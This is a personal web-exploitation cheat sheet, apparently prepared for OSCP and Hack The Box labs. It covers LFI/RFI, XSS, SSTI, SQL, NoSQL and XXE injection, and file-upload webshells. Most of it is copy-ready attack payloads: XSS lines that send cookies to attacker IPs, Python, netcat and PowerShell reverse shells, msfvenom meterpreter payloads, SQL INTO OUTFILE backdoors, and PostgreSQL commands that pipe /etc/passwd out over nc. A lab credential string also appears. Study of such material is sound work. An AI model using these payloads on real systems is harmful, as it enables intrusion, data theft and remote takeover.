# Web Attacks!
## General Process:  

	  Always try to Find the Application Version!!
	  Tools:
	    burpsuite (set up w/ foxyproxy extension)
	    cookie editor extension
	  Things to Check:
		Source code
			comments, urls, hard-coded credentials, functions, etc.
		Browser Dev Tools->Network Headers->Response Headers->server versions, etc.
		Cookies
		Requests & responses in burpsuite -> try to break things & produce errors
		Input boxes:
			code injection ( ; id)
			sql injection (' or ")
			xss (<script>alert(‘XSS’)</script>)
		URLs: look for strange parameters, file extensions, etc.
		Anywhere to edit content? - php themes, etc.
		Anywhere to upload files? - profile picture, plugins, etc.  

## Admin Consoles:  

	Look up default credentials
	See password attacks page
		brute force, try scraping from website
		Creating brute-force password lists: Crunch, Cewl (website-crawler)
		Scraping emails from website:  cewl -n -e --email_file mailid.txt http://sneakycorp.htb
	PHP login bypass in burpsuite:  username=admin&password[]=

## URL Techniques:  

    LFI/Directory Traversal:  php 'include' statement means code is executed            
        ex. ?page=/../../../../../etc/passwd OR ?file=c:\windows\system32\drivers\etc\hosts 
        See LFI Interesting Files
		Windows:  https://notchxor.github.io/oscp-notes/4-win-privesc/15-LFI-FILES/
        LFI Cheat Sheat/reverse shell methods:  https://highon.coffee/blog/lfi-cheat-sheet/  
        PHP Wrapper Method:
		Cheat sheet:  https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers-and-protocols
        	ex. http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
	Filter Bypass Examples:  
		req.params["0"].split("../").join("")  ->  ....//....//....//....//....//etc//passwd
		../../../../../boot.ini%00.jpg
		../../../../../etc/passwd%0a.jpg
		../../../../../etc/passwd%00
    LFI TO RCE:
        Log poisoning
            See what logs you can include, then figure out how to get that service to log your request
            ex. log into ftp server with user of '<? php system($_GET['cmd']); ?>' , then lfi the var/log/vsftpd.log
            /var/log/apache2/access.log:   `nc 1.1.1.1 80, then GET /<?php system($_GET['cmd']);?>`
            /proc/self/environ: use burp (https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) to send malicious url with a modified user-agent
            Windows: `?file=c:\xampp\apache\logs\access.log&cmd=ipconfig   nc -nv 1.1.1.1 80 ,   <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
            Email method:  https://bitvijays.github.io/LFC-VulnerableMachines.html
            LFI log contamination tactic: connect w/:  nc -nv 10.11.0.22 80, then send:  <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
            	then:  http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
    RFI:
    	ex. make and host a local evil.txt file:  <?php echo shell_exec($_GET['cmd']); ?>
                http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
        Try shell saved as .txt, .php, etc. - see what type of scripts the site uses
        works if allow_url_fopen and allow_url_include both = On in the file /etc/php5/cgi/php.ini -- php.ini location is seen in phpinfo.php file
        ex. Using reverse.txt php shell:  `?page=http://1.2.3.4/reverse.txt?  OR:  ?page=http://1.2.3.4/reverse.txt%00`
	
	PHP Execution:
		?code=phpinfo()
		?code=system('id'); (if single line output)
		?code=echo shell_exec('/sbin/ifconfig eth0'); (if multiple line output)
  
## Cross-Site Scripting (XSS):  

	If you can execute reflected or stored .js code
	3 types: persistent/stored, reflected, DOM based
        	Stored: look for comments, reviews, user profile, guestbook, contact form, etc.
        	Reflected: search box, etc.
	Checks:
		Cheat Sheet:  https://www.jb51.net/tools/xss.htm
        	Look for unsanitized input that is displayed as output; characters to try:  < > ' " { } ;  -> Check Source Code; see how they're stored
		Try javascript code in all input boxes, username/password (if displays incorrect username), search (if results display the searched keywords) -- or URLs
        	Basic payload:  <script>alert(123)</script>
	Techniques & Payloads:
		Test:  <script>alert("XSS")</script>
		Script:  <img src="10.10.14.18/test.jpg" /> <script src="http://10.10.14.18/test.js"></script>
		Steal Cookie (if Secure and HTTPOnly flags not set):
			Example 1:  <script>new Image().src="http://10.10.28.40:8000/cool.jpg?output="+document.cookie;</script> ; sudo nc -nvlp 80
			Example 2:  <script>document.location="http://10.10.14.18 username="+document.cookie;</script>
			Example 3:
				function pwn() {
				    var img = document.createElement("img");
				    img.src = "http://10.10.14.18/xss?=" + document.cookie;
				    document.body.appendChild(img);
				}
				pwn();
				<script src="http://10.10.14.18/xss.js"></script>
				python -m SimpleHTTPServer 80
		Reverse Shell:  <img src=http://10.10.15.25/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.15.25'$IFS'4444')>
		Windows Reverse Shell (if the website can run the dir command):
			Method 1:  <script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.18:80/mini-reverse.ps1')");</script>
			Better Method:  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe -o payload.exe
				<script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.18:80/payload.exe','C:/temp/payload.exe')");</script>	
		Session Hijack (upload BEEF hook): <script src="http://1.2.3.4:3000/hook.js"></script>  (copy from beef program)
		
## Cross-Site Request Forgery (XSRF):  

	If you can get a user to click a link
	See if you have a password reset form, etc. that can be submitted via url -- make the admin account click it and change to your desired password
		ex. http://10.10.10.97/change_pass.php?password=password&confirm_password=password&submit=submit ; Confirm: nc -nvlp 80; http://<yourIP>/complete

## Server-Side Template Injection (SSTI):  

	If you can inject content into a page's source code - may appear similar to XSS
	Detect:  {{7*7}}  ;  ${{<%[%'"}}%\.
	Methodology:  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology
		https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
		Example:  https://shubham-singh.medium.com/doctor-htb-walkthrough-70bcb9eedefd 
		Step 1: Follow diagram to determine template engine
	Wordlist of GET/POST parameters:  https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt
	*Automated Tool:  https://github.com/epinna/tplmap
		Python fix:  https://fahmifj.github.io/blog/tplmap-install/
	{{config}}; {{.}}; 
	Golang: {{ .DebugCmd "id" }}
	Jinja templating engine example:
		Common payload (python2):  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
            		Try variants for both Python versions!
		Bypassing '.__' filter with Jinja attr() filter for concatenation:
			{% set string = "ssti" %}
			{% set class = "__class__" %}
			{% set mro = "__mro__" %}
			{% set subclasses = "__subclasses__" %}
			Exploit Methodology:
				{{ string|attr(class) }} - same as {{ "ssti".__class__ }}
				{{ string|attr(class)|attr(mro) }}
			Next:
				{% set string = "ssti" %}
				{% set class = "__class__" %}
				{% set mro = "__mro__" %}
				{% set subclasses = "__subclasses__" %}
				{% set mro_r = string|attr(class)|attr(mro) %}
				{{ mro_r[1] }}
			Next:
				{% set string = "ssti" %}
				{% set class = "__class__" %}
				{% set mro = "__mro__" %}
				{% set subclasses = "__subclasses__" %}
				{% set mro_r = string|attr(class)|attr(mro) %}
				{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
				{{ subclasses_r }}
			Selecting subprocess.Popen:  {{ subclasses_r[997] }}
				RCE (create file):  {{ subclasses_r[997](["/usr/bin/touch","/tmp/test"]) }}
				RCE (shell):  {{ subclasses_r[997](["/usr/bin/python2.7","-c",'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']) }}


## SQL Injection (SQLI):  

	If a database is queried without proper input sanitization
	Checks:
		Input fields:  see if ' or " cause errors
        	URL parameters:  might need to URL encode
			?id=1' produces error?
			?cod=1+and+2=2  displays correctly?
		Crawl:  sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3
	Authentication bypass:
		username:  admin'# ; password:   abc' OR 1=1#
		' or '1'='1
        	tom' or 1=1;#
		admin' or 1=1-- -
		abc' OR 1=1--
		Others:  https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ or https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html
        	Fix "multiple row" error:   tom' or 1=1 LIMIT 1;#
	Example SQL Queries & Syntax:
		select * from accounts where username='$user' and password='$pass'
		Comment symbol: # (MySQL) or -- (standard SQL)	
	Manual Exploitation Process:  figure out structure, then extract data
		URL Parameter:
			1. Determine number of columns:
			    ?id=1 order by 1;    -> increment until error
			2. See which columns #'s are being displayed:
			    ex. if 4 columns:   ?id=1 union all select 1, 2, 3
			3. Extract data:
				?id=1 union all select 1, 2, @@version  (or version())
				union all select 1, 2, user()
				union all select 1, 2, database()
				UNION SELECT 1,concat(table_name,char(58),column_name) from information_schema.columns #
				union all select 1, 2, table_name from information_schema.tables
				    union all select 1, 2, column_name from information_schema.columns where table_name='users'
				    union all select 1, username, password from users
					or:  union select 1,2,concat(name,0x3a,password) FROM users
				Read File:  union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
					UNION SELECT 1, load_file(/etc/passwd) #
					union select null,load_file('/etc/passwd'),null,null,null
				Make Backdoor:  
					Win:  union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/cmd.php'
						Or:  union select '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/_0xdf.php'#
					Unix:  union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
						Or:  ?cod=1+union+select+1,2,3,4,5,6,'<?php_system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php'
			    		Access:  10.11.0.22/backdoor.php?cmd=ifconfig
					Windows: try creating admin user and add to RDP group
	Automated Exploitation:
		Post:
			Capture request w/ burp & save, then:  sqlmap -r request.txt -p username
		Get:
		    sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
			Dump database:   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump [-D Webapp -T Users]
			Open Shell:   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
		Examples:
			Automated Scan:  sqlmap -u http://example.com --forms --batch --crawl=10 --cookie=sessionid=12345 --level=5 --risk=3
			Targeted Scan:  sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/page.php" 
			Check Form for Injection:  sqlmap -o -u "http://example.com/form/" --forms
			sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql --technique=U --random-agent --dump
			sqlmap -o -u "http://example.com/vuln-form" --forms -D database-name -T users --dump
	Blind SQL Injection:
		Boolean (if you have a visual indicator):
			MySQL:
				True:  AAAA')/**/or/**/(select/**/1)=1%23
            			False:  AAAA')/**/or/**/(select/**/1)=0%23
				Extraction:  q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=53%23
		Time-Based (if no feedback is displayed):
			PostgreSQL:  ?userId=1;%20SELECT%20pg_sleep(10)%20--
	SQL command LFI/reverse shell:  add field in table with value:  <?php system($_REQUEST["cmd"]);?>
	Follow-on Auth Bypass Methods:
		dump hashes and crack passwords
		account hijack methods (ex. stealing password reset token)
	Fix Collation Error:
                Check Injection Site:  abc" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#
                Then Apply:  abc" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
            Ex. Finding value/pulling column names:  abc" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#
                Pull value:  abc" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#
### Useful MySQL Queries:

	SELECT...
	
	concat(host, char(58), user, char(58), password) FROM mysql.user
	user()
	system_user()
	version()
	database()
	@@hostname
	@@datadir
	schema()
	LOAD_FILE('/etc/passwd')
	schema_name FROM information_schema.schemata LIMIT 0,1		#First Limit is offset; second is number of records to pull/display
	table_name from information_schema.tables
	user FROM mysql.user LIMIT 0,1

	//**Databases, Tables, and Columns:   concat(table_schema, char(58), table_name, char(58), column_name) FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
	//Databases: schema_name FROM information_schema.schemata
	//Tables: table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
		//Or: TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1"
	//Columns: column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1"
	//Data: column1 FROM table1 LIMIT %s,1
		ex. concat(login, char(58), password) FROM atutor.AT_admins
		//From another database: column1 FROM database2.table1
	//Users: user FROM mysql.user
	//Password Hashes (mysql): concat(host, char(58), user, char(58), password) FROM mysql.user
### Useful PostgreSQL Queries:
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
	version();
	user; \\ current_user; \\ session_user; \\ usename FROM pg_user; \\ getpgusername();
	usename, passwd FROM pg_shadow;
	Privs:  usename, usecreatedb, usesuper, usecatupd FROM pg_user;  \\  current_setting('is_superuser');
	Admins:  usename FROM pg_user WHERE usesuper IS TRUE;
	current_database();
	inet_server_addr();
	inet_server_port();
	current_setting('data_directory');
	SELECT current_setting('hba_file');

	Databases:  SELECT datname FROM pg_database;
	Tables:  SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r',") AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid);
	    SELECT table_name FROM information_schema.tables
	Columns:  SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public');
	    SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
	Read File:  CREATE temp table mytable (content text); COPY mytable from $$c:\\Windows\\System32\\Drivers\\etc\\hosts$$; SELECT content from mytable LIMIT 1 OFFSET 0; DROP table mytable;
	    Method 2:  SELECT lo_import($$C:\\Windows\\win.ini$$,1337); select loid, pageno, encode(data, 'escape') from pg_largeobject; ->After:  SELECT lo_unlink(l.oid) FROM pg_largeobject_metadata l;  OR  SELECT lo_unlink(1337);
	Create File:  CREATE TABLE mytable (mycol text); INSERT INTO mytable(mycol) VALUES ('<?php passthru($_GET[cmd]); ?>'); COPY mytable (mycol) TO '/tmp/test.php'; 
	    Or:  COPY (SELECT $$abc$$) to $$c:\\abc.txt$$;
	    Reverse Shell Upload (use POST, with one-liner payload base64 encoded, then URL encoded):  copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
		Payload:  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
	    Method 2:  see large object method
	Run Command:  CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT; SELECT system('cat /etc/passwd | nc 10.0.0.1 8080');
	Time Delay:  SELECT pg_sleep(10);
	Base64 Encoding:  select convert_from(decode('YWJj==', 'base64'), 'utf-8');
	Hex Encoding and Concatenation:  SELECT CHR(117) || CHR(115) || CHR(101) || CHR(114);   \\same as SELECT user;
	Substitute for Quotes:  SELECT 'user';  =  SELECT $$user$$;  =  SELECT $TAG$user$TAG$;
	    ex. CREATE TEMP TABLE mytable(mycolumn text);INSERT INTO mytable(mycolumn) VALUES ($$test$$); COPY mytable(mycolumn) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
	Blind Time-Based:
	    SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
	    Reading File:  create+temp+table+ABC+(content+text);copy+ABC+from+$$c:\ABC.txt$$;select+case+when(ascii(substr((select+content+from+ABC),1,1))=104)+then+pg_sleep(10)+end;--+
	Large Objects:
	    select lo_import('C:\\Windows\\win.ini', 1337);	//load file into memory
	    select loid, pageno from pg_largeobject;	//file is divided into 2kb 'pages' in the table
	    select loid, pageno, encode(data, 'escape') from pg_largeobject;
	    update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;	//update each page individually
	    select lo_export(1337, 'C:\\new_win.ini');	//resave as new file
	    SELECT lo_unlink(1337);	//delete LO from memory
	Loading Extensions (User-Defined Functions):
		CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.1.1\myshare\exec.dll$$, $$execFunc$$ LANGUAGE C STRICT;
                SELECT remote_test($$calc.exe$$, 3);
		CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\\\192.168.119.158\\awae\\rev_shell.dll$$,$$connect_back$$ LANGUAGE C STRICT;
		SELECT rev_shell($$192.168.1.1$$, 4444);
		Base64 Insert:
			INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
			INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
			INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
		Hex Insert:  update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0; 

### HSQLDB Interaction:
	Download .jar and connect:  java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://abc:9001/app --user abc --password abc
	RCE - calling Java code via custom procedures:
		ex. Checking system properties:
                    CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
                     LANGUAGE JAVA 
                     DETERMINISTIC NO SQL
                     EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
                    Call it:  VALUES(systemprop('java.class.path'))
		Use Function in the App's Class Path (ex. a write file function):
                    CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte 
                    VARBINARY(1024)) 
                     LANGUAGE JAVA 
                    DETERMINISTIC NO SQL
                     EXTERNAL NAME 
                    'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
                    Convert payloads to ascii hex, then call:
                        call writeBytesToFilename('test.txt', cast ('497420776f726b656421' AS VARBINARY(1024)))
                    RCE Options:
                        write JSP webshell and access in browser
                    Write Webshell (/usr/share/webshells/jsp/cmdjsp.jsp):
                        convert to Linux; make smaller by removing html; encode to hex
                        call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/abc/shell.jsp', cast('ABC...' as VARBINARY(1024)))
                        ACCESS:  curl http://abc:8080/abc/shell.jsp?cmd=hostname

## NOSQL Injection:  

	in burp, try: username[$ne]=..., password[$ne]=...
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
	If injection succeeds, enumerate accounts with: https://raw.githubusercontent.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/master/nosqli-user-pass-enum.py
	python3 mangoenum.py -u http://staging-order.mango.htb/ -up username -pp password -op login:login -ep username
		then: python3 mangoenum.py -u http://staging-order.mango.htb/ -up username -pp password -op login:login -ep password

## XML External Entity (XXE):  

	If there's an XML parser without proper input validation (API, etc.)
	Used for: enumeration; finding creds (Java)
		Some languages like PHP can lead to RCE
	Internal Entities:  <!ENTITY name "entity_value">, ex. <!ENTITY test "<entity-value>test value</entity-value>">
        External Entities:  
            Private:  <!ENTITY name SYSTEM "URI">, ex. <!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml">
            Public:  <!ENTITY name PUBLIC "public_id" "URI">, ex. <!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://www.offsec.com/companyinfo.xml">
        Parameter Entities:  <!ENTITY % name SYSTEM "URI">, ex. <!ENTITY % course 'AWAE'> then <!ENTITY Title 'Offensive Security presents %course;' >
        Prevent Payload Parsing:
            Private:  <!ENTITY name SYSTEM "URI" NDATA TYPE>
            Public:  <!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
	XXE Example:
            <?xml version="1.0"?>
            <!DOCTYPE data [
            <!ELEMENT data ANY >
            <!ENTITY lastname SYSTEM "file:///etc/passwd">
            ]>
            <org.opencrx.kernel.account1.Contact>
             <lastName>&lastname;</lastName>
             <firstName>Tom</firstName>
            </org.opencrx.kernel.account1.Contact>
            If the lastName contents are included in a server response or we can retrieve its output, we can read files on the server.
	Output Formatting with CDATA:
            Host wrapper on attack box as wrapper.dtd:  <!ENTITY wrapper "%start;%file;%end;">
            <?xml version="1.0"?>
            <!DOCTYPE data [
            <!ENTITY % start "<![CDATA[">
            <!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
            <!ENTITY % end "]]>">
            <!ENTITY % dtd SYSTEM "http://192.168.1.1/wrapper.dtd" >
            %dtd;
            ]>
            <org.opencrx.kernel.account1.Contact>
             <lastName>&wrapper;</lastName>
             <firstName>Tom</firstName>
            </org.opencrx.kernel.account1.Contact>

## PHP Content Injection:  

	Anywhere to edit and then execute/access a .php file? - Wordpress/Joomla theme file, etc.
		See reverse shells page - pick language based on web page format
			*PHP Advanced Content Inject Reverse Shell
	Troubleshooting:  try URL encoding of characters; if shell is blocked, try common port like 80 or 443
	Test:  <?php phpinfo(); ?>
	ex. <?php echo shell_exec($_GET['cmd']); ?>
		http://127.0.0.1/webshell.php?cmd=id
		http://127.0.0.1/wordpress/?cmd=nc [IP attack box] [port] -e /bin/sh
	ex. <?php system($_GET["cmd"]); ?>
	ex. <?php passthru($_GET["cmd"]); ?>	
	ex. PHP Non-Interactive Web Shell:
		<?php if (isset($_REQUEST[‘fupload’])) { file_put_contents($_REQUEST[‘fupload’], file_get_contents(‘http://IP_ADDR/' . $_REQUEST[‘fupload’])); }; if (isset($_REQUEST[‘fexec’])) { echo ‘<pre>’ . shell_exec($_REQUEST[‘fexec’]) . ‘</pre>’; }; ?>
		Access: <filename>.php?fupload=nc.exe (for example) and <filename>.php?fexec=nc IP PORT
	
## File Upload / Web Shells:  

	General Upload Test:  `davtest -url http://10.10.10.15`
	Look for alternate upload locations: SMB, FTP, etc.
		Example:
			smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put cmd.php cmd.php'
			curl -s -X GET http://secnotes.htb:8808/cmd.php?cmd=whoami
			smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put nc.exe nc.exe'
			curl -s -X GET http://secnotes.htb:8808/cmd.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+443
	PHP Web Shell:  ex. https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php	
	Filter Bypass:
		https://book.hacktricks.xyz/pentesting-web/file-upload
		https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
		- Rename:
			Try upload as shell.php.jpg or shell.php%00.jpg or shell.jpg.php
			.php, .pht, .phtml, .php3, .php4, .php5, .inc
			.asp, .aspx
			.pl, .pm, .cgi, .lib
			.jsp, .jspx, .jsw, .jsv, .jspf
			.cfm, .cfml, .cfc, .dbm
		- Rename after uploading (ex. upload as .html, then move to .aspx):
			    - Upload file with curl:  `curl http://10.10.10.15/ --upload-file shell.txt`
				- or:   `curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php`
			- Move/Rename file:  `curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt`
				- ex.  `curl -X MOVE --header "Destination:http://10.10.10.15/nc.exe" http://10.10.10.15/nc.txt`
		-Bypass MIME type validation:
			Burpsuite: modify POST request Content-Type header
			Edit magic bytes:  echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png
				Or:  add before shellcode: `GIF89a;`
		-Image Hidden PHP Code (bypasses getimagesize() validation):
			w/ Gimp--put code in properties/comments 
			exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
	ex. PHP code in image:
		cp original.png ./shell.php.png
		echo '<?php' >> ./shell.php.png
		echo 'passthru("whoami");' >> ./shell.php.png
		#echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f");' >> ./shell.php.png
			Or: echo 'system($_REQUEST["cmd"]);' >> ./shell2.php.png
		echo '?>' >> ./shell.php.png
		visit example.com/uploads/shell.php.png or example.com/uploads/shell.php.png?cmd=id

## Specific Applications/Vulnerabilities:  

	PHPMyAdmin:
		in sql console:  select * from webappdb.users;
		make a user:  insert into webappdb.users(password, username) VALUES (”backdoor“,”backdoor“);
	Tomcat Web Application Manger War Shell Upload:
		msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=4444 -f war -o pwn.war
		***: curl -T "pwn.war" -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/miao&update=true"
		Or automate with:  https://github.com/mgeeky/tomcatWarDeployer
		python autowar.py http://10.10.10.95:8080 -U tomcat -P s3cret -H <attacking machine IP> -P 4321
	CGI-BIN Directory: look for .sh scripts (Shellshock vulnerability):
		dirb http://10.10.10.56/cgi-bin -X .sh
